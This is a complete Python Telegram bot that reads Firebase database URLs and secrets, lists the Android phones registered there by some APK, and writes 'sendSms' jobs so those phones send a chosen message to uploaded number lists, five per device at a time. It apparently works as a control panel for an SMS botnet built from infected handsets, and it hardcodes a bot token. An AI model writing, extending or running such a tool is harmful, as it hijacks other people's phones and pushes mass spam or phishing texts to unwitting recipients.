#!/usr/bin/env python3
"""
spinach Multi-User Automatic SMS Bot
Firebase input: URL list only (txt). Optional database secret per line.
No service-account JSON required — uses Firebase REST API (same as NEXUS panel).

Flow:
  1. User uploads .txt with Firebase RTDB URLs (one per line)
     Optional format: URL|SECRET   or   URL SECRET
  2. Bot scans every project → finds online devices
  3. User uploads recipient numbers (.txt)
  4. User sends custom SMS text
  5. Bot distributes: max 5 SMS per online device, then switch
  6. Live progress bar → auto-stop when all recipients done
"""

import os
import re
import json
import time
import uuid
import threading
import logging
from typing import Any, Optional
from collections import defaultdict
from dataclasses import dataclass, field
from urllib.parse import quote

import telebot
from telebot import types
import requests

# ── CONFIG ────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8763280422:AAFwSQvwIgSrgqBsGJTZmjGFe0kKlvHVD_o")
ALLOWED_USERS: set[int] = set()  # empty = everyone
SMS_PER_DEVICE = 5
# Match 2.py: 15 min freshness window for lastSeen / heartbeat
ONLINE_WINDOW_MS = 15 * 60 * 1000
JOB_DELAY_SEC = 2.0
PROGRESS_EDIT_EVERY = 3
HTTP_TIMEOUT = 25

# ── LOGGING ───────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("multi-sms-bot")

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ── SESSION STATE ─────────────────────────────────────────────────────────
@dataclass
class FirebaseProject:
    name: str
    db_url: str
    secret: str = ""  # database secret (optional; empty = open rules)
    devices: list[dict] = field(default_factory=list)

@dataclass
class Session:
    chat_id: int
    step: str = "idle"  # idle | await_firebase | await_numbers | await_message | running | done
    projects: list[FirebaseProject] = field(default_factory=list)
    online_devices: list[dict] = field(default_factory=list)
    numbers: list[str] = field(default_factory=list)
    message: str = ""
    sent: int = 0
    failed: int = 0
    total: int = 0
    progress_msg_id: Optional[int] = None
    cancel: bool = False
    lock: threading.Lock = field(default_factory=threading.Lock)

sessions: dict[int, Session] = {}
sessions_lock = threading.Lock()

def get_session(chat_id: int) -> Session:
    with sessions_lock:
        if chat_id not in sessions:
            sessions[chat_id] = Session(chat_id=chat_id)
        return sessions[chat_id]

def reset_session(chat_id: int):
    with sessions_lock:
        old = sessions.get(chat_id)
        if old:
            old.cancel = True
        sessions[chat_id] = Session(chat_id=chat_id)

def is_allowed(uid: int) -> bool:
    if not ALLOWED_USERS:
        return True
    return uid in ALLOWED_USERS

# ── FIREBASE REST (URL + optional database secret) ────────────────────────
def norm_url(raw: str) -> str:
    u = (raw or "").strip()
    if not u:
        return ""
    if not re.match(r"^https?://", u, re.I):
        u = "https://" + u
    return u.rstrip("/")

def fb_url(base: str, path: str = "", secret: str = "") -> str:
    """Build REST endpoint: {base}/{path}.json?auth=SECRET
    Path may already end with .json (2.py style) — do not double it.
    """
    base = norm_url(base)
    path = (path or "").strip().strip("/")
    if path:
        if path.endswith(".json"):
            ep = f"{base}/{path}"
        else:
            ep = f"{base}/{path}.json"
    else:
        ep = f"{base}/.json"
    if secret:
        ep += f"?auth={quote(secret, safe='')}"
    return ep

def fb_get(base: str, path: str = "", secret: str = "", shallow: bool = False) -> Any:
    url = fb_url(base, path, secret)
    if shallow:
        url += ("&" if "?" in url else "?") + "shallow=true"
    r = requests.get(url, timeout=HTTP_TIMEOUT)
    if r.status_code in (401, 403):
        raise RuntimeError(
            f"Auth failed ({r.status_code}). "
            "Add database secret after URL: URL|SECRET  "
            "(Firebase Console → Project settings → Service accounts → Database secrets)"
        )
    if r.status_code == 404:
        raise RuntimeError(f"Not found (404): {base}")
    if r.status_code == 423:
        raise RuntimeError("DB locked (423). Project suspended or over quota.")
    if r.status_code == 429:
        raise RuntimeError("Rate limited (429). Wait and retry.")
    if not r.ok:
        raise RuntimeError(f"HTTP {r.status_code}: {r.text[:200]}")
    if not r.text or r.text == "null":
        return None
    return r.json()

def fb_put(base: str, path: str, data: dict, secret: str = "") -> None:
    url = fb_url(base, path, secret)
    r = requests.put(url, json=data, timeout=HTTP_TIMEOUT)
    if r.status_code in (401, 403):
        raise RuntimeError(f"Auth failed ({r.status_code}) on write")
    if not r.ok:
        raise RuntimeError(f"Write HTTP {r.status_code}: {r.text[:200]}")

def fb_patch(base: str, path: str, data: dict, secret: str = "") -> None:
    url = fb_url(base, path, secret)
    r = requests.patch(url, json=data, timeout=HTTP_TIMEOUT)
    if r.status_code in (401, 403):
        raise RuntimeError(f"Auth failed ({r.status_code}) on patch")
    if not r.ok:
        raise RuntimeError(f"Patch HTTP {r.status_code}: {r.text[:200]}")

# ── ONLINE DETECTION (mirrors NEXUS panel) ────────────────────────────────
def parse_timestamp(val) -> Optional[int]:
    if val is None:
        return None
    try:
        if isinstance(val, (int, float)):
            t = int(val)
            if t < 1_000_000_000_000:
                t *= 1000
            return t
        if isinstance(val, str):
            s = val.strip()
            if s.isdigit():
                t = int(s)
                if t < 1_000_000_000_000:
                    t *= 1000
                return t
            from datetime import datetime
            for fmt in ("%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%d %H:%M:%S"):
                try:
                    return int(datetime.strptime(s[:26], fmt).timestamp() * 1000)
                except Exception:
                    pass
    except Exception:
        pass
    return None

def is_device_online(node: dict) -> tuple[bool, Optional[int]]:
    """
    Broad online detection aligned with 2.py + NEXUS:
    - isOnline / online / connected truthy
    - status: True | 1 | "online" | "active" | "alive" | "on" | "connected"
    - lastOnlineAt / lastSeen / updatedAt / timestamp within ONLINE_WINDOW_MS (15m)
    - heartbeat dict or scalar timestamp
    Also walks nested info/status objects used by some APKs.
    """
    if not isinstance(node, dict):
        return False, None

    now_ms = int(time.time() * 1000)
    info = node.get("info") if isinstance(node.get("info"), dict) else {}
    st_obj = node.get("status") if isinstance(node.get("status"), dict) else {}
    if not st_obj and isinstance(info.get("status"), dict):
        st_obj = info["status"]

    # Collect best last-seen style timestamp for reporting + freshness
    ts_keys = (
        "lastOnlineAt", "last_seen", "lastSeen", "lastSeenAt",
        "lastOnline", "last_online", "lastActive", "last_active",
        "updatedAt", "updated_at", "last_update", "lastUpdate",
        "timestamp", "ts", "time", "dateTime", "lastMessageTime",
        "last_heartbeat", "lastHeartbeat", "joined",
    )
    last_seen = None
    for src in (node, info, st_obj):
        if not isinstance(src, dict):
            continue
        for k in ts_keys:
            t = parse_timestamp(src.get(k))
            if t is not None and (last_seen is None or t > last_seen):
                last_seen = t

    # heartbeat nested
    hb = node.get("heartbeat")
    if isinstance(hb, dict):
        for k in ("timestamp", "ts", "time", "lastSeen", "updatedAt"):
            t = parse_timestamp(hb.get(k))
            if t is not None and (last_seen is None or t > last_seen):
                last_seen = t
    else:
        t = parse_timestamp(hb)
        if t is not None and (last_seen is None or t > last_seen):
            last_seen = t

    # ── boolean / flag fields (2.py style: truthy, not only `is True`) ──
    for src in (node, info, st_obj):
        if not isinstance(src, dict):
            continue
        if src.get("isOnline") or src.get("online") or src.get("connected") or src.get("alive"):
            return True, last_seen

    # ── status field ──
    raw = None
    if not isinstance(node.get("status"), dict):
        raw = node.get("status")
    if raw is None and not isinstance(info.get("status"), dict):
        raw = info.get("status")
    if raw is None and isinstance(st_obj, dict):
        raw = st_obj.get("status")
    if raw is None:
        raw = node.get("state") or info.get("state")

    if raw is True or raw == 1:
        return True, last_seen
    if isinstance(raw, str):
        sl = raw.lower().strip()
        if sl in ("online", "active", "alive", "on", "true", "1", "connected"):
            return True, last_seen
        # non-empty string that is not an explicit offline word → treat online (NEXUS)
        if sl and sl not in ("false", "0", "no", "offline", "inactive", "disconnected", "dead", "gone"):
            return True, last_seen
    if isinstance(raw, (int, float)) and raw != 0:
        return True, last_seen
    if isinstance(raw, dict):
        if raw.get("online") or raw.get("isOnline") or raw.get("connected") or raw.get("active") or raw.get("alive"):
            return True, last_seen

    # ── heartbeat status string ──
    if isinstance(hb, dict):
        hb_st = str(hb.get("status") or "").lower()
        if hb_st in ("alive", "online", "active"):
            return True, last_seen

    # ── timestamp freshness (15 min window, allow small clock skew) ──
    if last_seen is not None:
        delta = now_ms - last_seen
        if -60_000 < delta < ONLINE_WINDOW_MS:
            return True, last_seen

    return False, last_seen

def extract_phone(node: dict) -> str:
    info = node.get("info") if isinstance(node.get("info"), dict) else {}
    candidates = [
        node.get("mobNo"), info.get("mobNo"),
        node.get("phone"), node.get("phoneNumber"), node.get("phone_number"),
        info.get("phone"), info.get("phoneNumber"),
        node.get("mobile"), node.get("number"), info.get("phoneNumber"),
        node.get("msisdn"), info.get("msisdn"),
    ]
    for c in candidates:
        if c is None:
            continue
        dig = re.sub(r"[^\d+]", "", str(c))
        if len(dig) >= 10:
            return dig
    sims = node.get("sims") or info.get("sims") or node.get("simInfo") or []
    if isinstance(sims, list):
        for s in sims:
            if isinstance(s, dict):
                p = s.get("phoneNumber") or s.get("number") or s.get("msisdn")
                if p and str(p) != "Unknown":
                    dig = re.sub(r"[^\d+]", "", str(p))
                    if len(dig) >= 10:
                        return dig
    return "—"

# ── PROJECT SCAN ──────────────────────────────────────────────────────────
def project_label(db_url: str) -> str:
    u = norm_url(db_url)
    m = re.search(r"https?://([^.]+)", u, re.I)
    return m.group(1) if m else u[:40]

def _merge_device_maps(*maps: dict) -> dict:
    """clients wins on conflicts (2.py order: clients first, then devices)."""
    merged: dict = {}
    for blob in maps:
        if not isinstance(blob, dict):
            continue
        for did, data in blob.items():
            if data is None or not isinstance(data, dict):
                continue
            did_s = str(did)
            if did_s.startswith(".") or did_s in ("webhookEvent", "actions", "config"):
                continue
            if did_s in merged:
                base = dict(merged[did_s])
                base.update({k: v for k, v in data.items() if v is not None})
                merged[did_s] = base
            else:
                merged[did_s] = data
    return merged

def scan_devices(db_url: str, secret: str = "") -> list[dict]:
    """
    Fetch clients/ + devices/ (2.py order) and mark online with broad heuristics.
    """
    out = []
    try:
        clients = None
        devices = None
        # Prefer clients (working APK path), then devices
        try:
            clients = fb_get(db_url, "clients", secret)
        except Exception as e:
            log.info("clients path miss %s: %s", db_url, e)
        try:
            devices = fb_get(db_url, "devices", secret)
        except Exception as e:
            log.info("devices path miss %s: %s", db_url, e)

        # If both failed hard, surface the devices error (or clients)
        if clients is None and devices is None:
            # one more try on root devices-only for error message
            snap = fb_get(db_url, "devices", secret)
            devices = snap

        merged = _merge_device_maps(
            clients if isinstance(clients, dict) else {},
            devices if isinstance(devices, dict) else {},
        )
        for did, node in merged.items():
            online, last_seen = is_device_online(node)
            phone = extract_phone(node)
            model = (
                node.get("deviceModel") or node.get("modelName") or node.get("model")
                or node.get("phone_model") or node.get("device_name") or node.get("name")
                or ""
            )
            out.append({
                "id": str(did),
                "online": online,
                "lastSeen": last_seen,
                "phone": phone,
                "model": str(model).strip() if model else "",
                "source": "clients+devices",
            })
        log.info(
            "scan %s → total=%d online=%d",
            project_label(db_url),
            len(out),
            sum(1 for d in out if d["online"]),
        )
    except Exception as e:
        log.warning("scan devices failed for %s: %s", db_url, e)
        raise
    return out

def push_sms_job(db_url: str, secret: str, device_id: str, to: str, body: str, chat_id: int) -> str:
    """
    Exact 2.py write order + payload fields.
    Paths include .json leaf (fb_url will not double-append).
    Also mirrors NEXUS queue as last fallback.
    """
    job_id = str(uuid.uuid4())[:12]
    now_ms = int(time.time() * 1000)
    # 2.py: sim_index default 0 (SIM 1). Also try 1 if needed by some APKs.
    to_n = to.strip()
    msg = body.strip()

    payload_simple_0 = {
        "from": 0,
        "to": to_n,
        "message": msg,
        "isSended": False,
    }
    payload_simple_1 = {
        "from": 1,
        "to": to_n,
        "message": msg,
        "isSended": False,
    }
    payload_cmd_0 = {
        "cmdId": now_ms,
        "from": 0,
        "to": to_n,
        "message": msg,
        "isSended": False,
        "sendOk": False,
    }
    payload_cmd_1 = {
        "cmdId": now_ms,
        "from": 1,
        "to": to_n,
        "message": msg,
        "isSended": False,
        "sendOk": False,
    }
    # NEXUS / AndroidSmsListener shape
    payload_nexus = {
        "to": to_n,
        "body": msg,
        "status": "pending",
        "createdAt": now_ms,
        "requestedBy": chat_id,
        "sim": 1,
    }
    # Some APKs use "sms" / "text" key names
    payload_alt = {
        "from": 0,
        "to": to_n,
        "sms": msg,
        "text": msg,
        "message": msg,
        "body": msg,
        "isSended": False,
        "status": "pending",
    }

    # Same path strings as 2.py (with .json) first
    attempts = [
        (f"clients/{device_id}/webhookEvent/sendSms.json", payload_simple_0),
        (f"devices/{device_id}/webhookEvent/sendSms.json", payload_simple_0),
        (f"devices/{device_id}/actions/sendSms.json", payload_cmd_0),
        (f"clients/{device_id}/actions/sendSms.json", payload_cmd_0),
        # sim slot 1 variants
        (f"clients/{device_id}/webhookEvent/sendSms.json", payload_simple_1),
        (f"devices/{device_id}/webhookEvent/sendSms.json", payload_simple_1),
        (f"devices/{device_id}/actions/sendSms.json", payload_cmd_1),
        (f"clients/{device_id}/actions/sendSms.json", payload_cmd_1),
        # without .json leaf (fb_url adds it)
        (f"clients/{device_id}/webhookEvent/sendSms", payload_simple_0),
        (f"devices/{device_id}/webhookEvent/sendSms", payload_simple_0),
        (f"devices/{device_id}/actions/sendSms", payload_cmd_0),
        (f"clients/{device_id}/actions/sendSms", payload_cmd_0),
        # NEXUS queue
        (f"devices/{device_id}/sendSms/{job_id}", payload_nexus),
        (f"clients/{device_id}/sendSms/{job_id}", payload_nexus),
        (f"devices/{device_id}/webhookEvent/sms", payload_alt),
        (f"clients/{device_id}/webhookEvent/sms", payload_alt),
    ]

    last_err = None
    wrote_paths = []
    # Write ALL primary 2.py paths so any APK listener present sees the job.
    primary = attempts[:4]
    extras = attempts[4:]

    for path, payload in primary:
        try:
            fb_put(db_url, path, payload, secret)
            wrote_paths.append(path)
            log.info("SMS job OK via %s → %s", path, to_n)
        except Exception as e:
            last_err = e
            log.warning("path fail %s: %s", path, e)

    if not wrote_paths:
        for path, payload in extras:
            try:
                fb_put(db_url, path, payload, secret)
                wrote_paths.append(path)
                log.info("SMS job OK via fallback %s → %s", path, to_n)
                break
            except Exception as e:
                last_err = e
                log.warning("fallback fail %s: %s", path, e)

    if not wrote_paths:
        raise RuntimeError(f"all send paths failed: {last_err}")

    # Read-back verify first written path
    try:
        check = fb_get(db_url, wrote_paths[0].replace(".json", ""), secret)
        log.info("verify %s → %s", wrote_paths[0], str(check)[:120] if check else "null")
    except Exception as e:
        log.warning("verify read failed: %s", e)

    return job_id

# ── PARSE INPUT FILES ─────────────────────────────────────────────────────
def parse_firebase_urls(text: str) -> list[tuple[str, str]]:
    """
    Parse lines into (url, secret).
    Supported:
      https://proj-default-rtdb.firebaseio.com
      https://proj-default-rtdb.firebaseio.com|SECRET
      https://proj-default-rtdb.firebaseio.com SECRET
      https://proj-default-rtdb.asia-southeast1.firebasedatabase.app
    """
    results = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        secret = ""
        url = line
        if "|" in line:
            parts = line.split("|", 1)
            url, secret = parts[0].strip(), parts[1].strip()
        else:
            # URL then space then secret (secret rarely has spaces)
            m = re.match(r"^(https?://\S+)\s+(\S+)$", line, re.I)
            if m:
                url, secret = m.group(1), m.group(2)
            else:
                # bare host without scheme
                m2 = re.match(r"^(\S+\.(?:firebaseio\.com|firebasedatabase\.app)\S*)\s+(\S+)$", line, re.I)
                if m2:
                    url, secret = m2.group(1), m2.group(2)
        url = norm_url(url)
        if not url or "firebase" not in url.lower():
            # still accept any https URL that looks like RTDB
            if not re.search(r"firebaseio\.com|firebasedatabase\.app", url, re.I):
                continue
        key = url.lower()
        if key in seen:
            continue
        seen.add(key)
        results.append((url, secret))
    return results

def parse_numbers(text: str) -> list[str]:
    """Keep numbers exactly as provided — do NOT auto-prefix +91."""
    nums = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        for tok in re.split(r"[\s,;|]+", line):
            dig = re.sub(r"[^\d+]", "", tok)
            if len(dig) < 8:
                continue
            if dig not in seen:
                seen.add(dig)
                nums.append(dig)
    return nums

# ── PROGRESS ──────────────────────────────────────────────────────────────
def progress_bar(sent: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * sent / total))
    return "█" * filled + "░" * (width - filled)

def format_progress(s: Session) -> str:
    left = max(0, s.total - s.sent - s.failed)
    pct = int(100 * (s.sent + s.failed) / s.total) if s.total else 0
    bar = progress_bar(s.sent + s.failed, s.total)
    status = "RUNNING" if s.step == "running" else ("DONE" if s.step == "done" else s.step.upper())
    return (
        f"<b>SMS Campaign — {status}</b>\n\n"
        f"<code>[{bar}]</code> {pct}%\n\n"
        f"✅ Sent: <b>{s.sent}</b>\n"
        f"❌ Failed: <b>{s.failed}</b>\n"
        f"⏳ Left: <b>{left}</b>\n"
        f"📦 Total: <b>{s.total}</b>\n"
        f"📱 Online devices: <b>{len(s.online_devices)}</b>\n"
        f"🔥 Projects: <b>{len(s.projects)}</b>"
    )

# ── WORKER ────────────────────────────────────────────────────────────────
def run_campaign(chat_id: int):
    s = get_session(chat_id)
    if not s.online_devices or not s.numbers or not s.message:
        bot.send_message(chat_id, "Missing devices / numbers / message. Restart with /start")
        return

    s.step = "running"
    s.sent = 0
    s.failed = 0
    s.total = len(s.numbers)
    s.cancel = False

    devices = list(s.online_devices)
    if not devices:
        bot.send_message(chat_id, "No online devices. Abort.")
        s.step = "idle"
        return

    queue: list[tuple[dict, str]] = []
    device_usage: dict[tuple, int] = defaultdict(int)
    di = 0
    for num in s.numbers:
        tried = 0
        while tried < len(devices):
            d = devices[di % len(devices)]
            key = (d["project_idx"], d["id"])
            if device_usage[key] < SMS_PER_DEVICE:
                queue.append((d, num))
                device_usage[key] += 1
                di += 1
                break
            di += 1
            tried += 1
        else:
            d = devices[di % len(devices)]
            queue.append((d, num))
            di += 1

    try:
        msg = bot.send_message(chat_id, format_progress(s))
        s.progress_msg_id = msg.message_id
    except Exception:
        s.progress_msg_id = None

    for idx, (dev, number) in enumerate(queue):
        if s.cancel:
            break
        proj = s.projects[dev["project_idx"]]
        try:
            push_sms_job(proj.db_url, proj.secret, dev["id"], number, s.message, chat_id)
            with s.lock:
                s.sent += 1
            log.info("sent %s via %s/%s", number, proj.name, dev["id"])
        except Exception as e:
            with s.lock:
                s.failed += 1
            log.warning("fail %s: %s", number, e)

        if s.progress_msg_id and ((idx + 1) % PROGRESS_EDIT_EVERY == 0 or idx == len(queue) - 1):
            try:
                bot.edit_message_text(format_progress(s), chat_id, s.progress_msg_id)
            except Exception:
                pass

        time.sleep(JOB_DELAY_SEC)

    s.step = "done"
    try:
        if s.progress_msg_id:
            bot.edit_message_text(format_progress(s), chat_id, s.progress_msg_id)
        bot.send_message(
            chat_id,
            f"<b>Campaign finished</b>\n"
            f"✅ {s.sent} queued on Firebase · ❌ {s.failed} failed · Total {s.total}\n\n"
            f"<i>Note: “queued” = job written to Firebase "
            f"(clients/…/webhookEvent/sendSms + devices/… paths). "
            f"Phone must be online with APK listening to actually transmit SMS.</i>\n\n"
            f"Use /start for a new run."
        )
    except Exception:
        pass

# ── HANDLERS ──────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start", "help"])
def cmd_start(message: types.Message):
    if not is_allowed(message.from_user.id):
        bot.reply_to(message, "Access denied.")
        return
    reset_session(message.chat.id)
    s = get_session(message.chat.id)
    s.step = "await_firebase"
    text = (
        "<b>Multi-User Auto SMS Bot</b>\n\n"
        "Firebase input = <b>URLs only</b> (no service-account JSON).\n\n"
        "1️⃣ Upload .txt with Firebase RTDB URLs (one per line)\n"
        "2️⃣ Bot scans all → lists <b>online</b> devices\n"
        "3️⃣ Upload recipient numbers .txt\n"
        "4️⃣ Send custom SMS text\n"
        "5️⃣ Bot sends <b>5 SMS per online device</b>, then switches\n"
        "6️⃣ Live progress → stops when done\n\n"
        "<b>Step 1 — send Firebase URL list now</b>\n"
        "Example lines:\n"
        "<code>https://myproj-default-rtdb.firebaseio.com</code>\n"
        "<code>https://myproj-default-rtdb.firebaseio.com|DATABASE_SECRET</code>\n"
        "<code>https://myproj-default-rtdb.asia-southeast1.firebasedatabase.app SECRET</code>\n\n"
        "If rules are locked, append Database Secret after URL "
        "(Console → Project settings → Service accounts → Database secrets).\n\n"
        "Commands: /cancel · /status · /start"
    )
    bot.reply_to(message, text)

@bot.message_handler(commands=["cancel"])
def cmd_cancel(message: types.Message):
    if not is_allowed(message.from_user.id):
        return
    s = get_session(message.chat.id)
    s.cancel = True
    s.step = "idle"
    bot.reply_to(message, "Cancelled. /start to begin again.")

@bot.message_handler(commands=["status"])
def cmd_status(message: types.Message):
    if not is_allowed(message.from_user.id):
        return
    s = get_session(message.chat.id)
    if s.total:
        bot.reply_to(message, format_progress(s))
    else:
        bot.reply_to(
            message,
            f"Step: <code>{s.step}</code>\n"
            f"Projects: {len(s.projects)}\n"
            f"Online devices: {len(s.online_devices)}\n"
            f"Numbers loaded: {len(s.numbers)}"
        )

@bot.message_handler(commands=["useall"])
def cmd_useall(message: types.Message):
    """Treat every found device (online+offline) as a sender — for APKs that never write presence."""
    if not is_allowed(message.from_user.id):
        return
    s = get_session(message.chat.id)
    if not s.projects:
        bot.reply_to(message, "No projects loaded. /start and upload Firebase URLs first.")
        return
    all_devs = []
    for pi, p in enumerate(s.projects):
        for d in p.devices:
            all_devs.append({
                "project_idx": pi,
                "id": d["id"],
                "phone": d.get("phone") or "—",
                "lastSeen": d.get("lastSeen"),
                "project": p.name,
            })
    if not all_devs:
        bot.reply_to(message, "No device nodes under clients/ or devices/ on any project.")
        return
    s.online_devices = all_devs
    s.step = "await_numbers"
    bot.reply_to(
        message,
        f"✅ Using <b>{len(all_devs)}</b> device(s) as senders (online check skipped).\n\n"
        f"<b>Step 2 — send recipient numbers .txt now</b>"
    )

@bot.message_handler(content_types=["document"])
def on_document(message: types.Message):
    if not is_allowed(message.from_user.id):
        return
    s = get_session(message.chat.id)
    doc = message.document
    fname = (doc.file_name or "").lower()

    try:
        file_info = bot.get_file(doc.file_id)
        raw = bot.download_file(file_info.file_path)
        text = raw.decode("utf-8", errors="ignore")
    except Exception as e:
        bot.reply_to(message, f"Download failed: {e}")
        return

    # ── Step 1: Firebase URL list ─────────────────────────────────────
    if s.step == "await_firebase":
        entries = parse_firebase_urls(text)
        if not entries:
            bot.reply_to(
                message,
                "No Firebase URLs found.\n"
                "Send a .txt with one URL per line, e.g.\n"
                "<code>https://PROJECT-default-rtdb.firebaseio.com</code>\n"
                "Optional secret: <code>URL|SECRET</code>"
            )
            return

        bot.reply_to(message, f"Found <b>{len(entries)}</b> URL(s). Scanning…")
        projects: list[FirebaseProject] = []
        all_online: list[dict] = []
        errors: list[str] = []

        for url, secret in entries:
            label = project_label(url)
            try:
                devices = scan_devices(url, secret)
            except Exception as e:
                errors.append(f"• <code>{label}</code>: {e}")
                continue
            online = [d for d in devices if d["online"]]
            proj = FirebaseProject(name=label, db_url=url, secret=secret, devices=devices)
            projects.append(proj)
            for d in online:
                all_online.append({
                    "project_idx": len(projects) - 1,
                    "id": d["id"],
                    "phone": d["phone"],
                    "lastSeen": d["lastSeen"],
                    "project": label,
                })

        s.projects = projects
        s.online_devices = all_online

        lines = [f"<b>Scan complete</b> — {len(projects)} project(s) ok\n"]
        for p in projects:
            on = sum(1 for d in p.devices if d["online"])
            sec = "🔐" if p.secret else "🔓"
            lines.append(f"• {sec} <code>{p.name}</code> — {len(p.devices)} device(s), <b>{on} online</b>")
        if errors:
            lines.append("\n<b>Failed</b>")
            lines.extend(errors[:8])
            if len(errors) > 8:
                lines.append(f"… +{len(errors)-8} more")
        lines.append(f"\n📱 <b>Total online devices: {len(all_online)}</b>")
        if all_online:
            for d in all_online[:15]:
                lines.append(f"  └ {d['project']}/{d['id']} ({d['phone']})")
            if len(all_online) > 15:
                lines.append(f"  … +{len(all_online)-15} more")
            lines.append("\n<b>Step 2 — send recipient numbers .txt now</b>")
            s.step = "await_numbers"
        else:
            # Show sample offline nodes so user can verify data is loading
            samples = []
            for p in projects:
                for d in p.devices[:3]:
                    ls = d.get("lastSeen")
                    ls_s = str(ls) if ls else "—"
                    samples.append(f"  · {p.name}/{d['id']} phone={d.get('phone')} lastSeen={ls_s}")
                if len(samples) >= 12:
                    break
            lines.append(
                "\n⚠️ No online devices (15m window).\n"
                "Scanned <code>clients/</code> + <code>devices/</code>.\n"
                "• If rules need auth: <code>URL|DATABASE_SECRET</code>\n"
                "• Or reply <code>/useall</code> to treat all found devices as senders"
            )
            if samples:
                lines.append("\n<b>Sample nodes seen:</b>")
                lines.extend(samples[:12])
            s.step = "await_firebase"
        bot.reply_to(message, "\n".join(lines))
        return

    # ── Step 2: numbers ───────────────────────────────────────────────
    if s.step == "await_numbers":
        nums = parse_numbers(text)
        if not nums:
            bot.reply_to(message, "No valid mobile numbers found. One per line or comma-separated.")
            return
        s.numbers = nums
        s.step = "await_message"
        bot.reply_to(
            message,
            f"Loaded <b>{len(nums)}</b> unique numbers.\n\n"
            f"<b>Step 3 — send the custom SMS text now</b>\n"
            f"(plain message, max ~1000 chars)"
        )
        return

    bot.reply_to(message, f"Unexpected file at step <code>{s.step}</code>. Use /start.")

@bot.message_handler(func=lambda m: True, content_types=["text"])
def on_text(message: types.Message):
    if not is_allowed(message.from_user.id):
        return
    if message.text and message.text.startswith("/"):
        return

    s = get_session(message.chat.id)

    # allow pasting URL list as plain text (not only document)
    if s.step == "await_firebase":
        entries = parse_firebase_urls(message.text or "")
        if entries:
            # reuse document path by faking a small flow
            bot.reply_to(message, f"Found <b>{len(entries)}</b> URL(s) in text. Scanning…")
            projects: list[FirebaseProject] = []
            all_online: list[dict] = []
            errors: list[str] = []
            for url, secret in entries:
                label = project_label(url)
                try:
                    devices = scan_devices(url, secret)
                except Exception as e:
                    errors.append(f"• <code>{label}</code>: {e}")
                    continue
                online = [d for d in devices if d["online"]]
                proj = FirebaseProject(name=label, db_url=url, secret=secret, devices=devices)
                projects.append(proj)
                for d in online:
                    all_online.append({
                        "project_idx": len(projects) - 1,
                        "id": d["id"],
                        "phone": d["phone"],
                        "lastSeen": d["lastSeen"],
                        "project": label,
                    })
            s.projects = projects
            s.online_devices = all_online
            lines = [f"<b>Scan complete</b> — {len(projects)} project(s)\n"]
            for p in projects:
                on = sum(1 for d in p.devices if d["online"])
                sec = "🔐" if p.secret else "🔓"
                lines.append(f"• {sec} <code>{p.name}</code> — {len(p.devices)} device(s), <b>{on} online</b>")
            if errors:
                lines.append("\n<b>Failed</b>")
                lines.extend(errors[:8])
            lines.append(f"\n📱 <b>Total online: {len(all_online)}</b>")
            if all_online:
                for d in all_online[:15]:
                    lines.append(f"  └ {d['project']}/{d['id']} ({d['phone']})")
                lines.append("\n<b>Step 2 — send recipient numbers .txt</b>")
                s.step = "await_numbers"
            else:
                samples = []
                for p in projects:
                    for d in p.devices[:3]:
                        samples.append(f"  · {p.name}/{d['id']} phone={d.get('phone')}")
                    if len(samples) >= 12:
                        break
                lines.append(
                    "\n⚠️ No online devices (15m window).\n"
                    "Scanned clients/ + devices/.\n"
                    "Reply <code>/useall</code> to use all found devices."
                )
                if samples:
                    lines.append("\n<b>Sample nodes:</b>")
                    lines.extend(samples[:12])
                s.step = "await_firebase"
            bot.reply_to(message, "\n".join(lines))
            return
        bot.reply_to(message, "Send a .txt with Firebase URLs, or paste URLs here (one per line).")
        return

    if s.step == "await_message":
        body = (message.text or "").strip()
        if not body:
            bot.reply_to(message, "Empty message. Send the SMS text.")
            return
        if len(body) > 1000:
            bot.reply_to(message, "Too long (max 1000). Shorten and resend.")
            return
        s.message = body

        max_capacity = len(s.online_devices) * SMS_PER_DEVICE
        note = ""
        if len(s.numbers) > max_capacity:
            note = (
                f"\n⚠️ {len(s.numbers)} numbers vs "
                f"{len(s.online_devices)}×{SMS_PER_DEVICE}={max_capacity} slots. "
                f"Extras continue round-robin."
            )
        bot.reply_to(
            message,
            f"<b>Ready to launch</b>\n\n"
            f"📱 Online devices: <b>{len(s.online_devices)}</b>\n"
            f"👥 Recipients: <b>{len(s.numbers)}</b>\n"
            f"📝 Message: <code>{body[:120]}{'…' if len(body)>120 else ''}</code>\n"
            f"🔁 Rule: {SMS_PER_DEVICE} SMS per device then switch\n"
            f"{note}\n\n"
            f"Starting… /cancel to abort"
        )
        t = threading.Thread(target=run_campaign, args=(message.chat.id,), daemon=True)
        t.start()
        return

    if s.step == "running":
        bot.reply_to(message, "Campaign running. /status or /cancel")
        return

    if s.step == "await_numbers":
        # allow pasting numbers as text too
        nums = parse_numbers(message.text or "")
        if nums:
            s.numbers = nums
            s.step = "await_message"
            bot.reply_to(
                message,
                f"Loaded <b>{len(nums)}</b> numbers.\n\n"
                f"<b>Step 3 — send the custom SMS text now</b>"
            )
            return
        bot.reply_to(message, "Send numbers .txt or paste numbers (one per line).")
        return

    bot.reply_to(message, "Use /start to begin.")

# ── MAIN ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    log.info("Starting multi-user auto SMS bot (URL mode)…")
    bot.infinity_polling(timeout=60, long_polling_timeout=30)
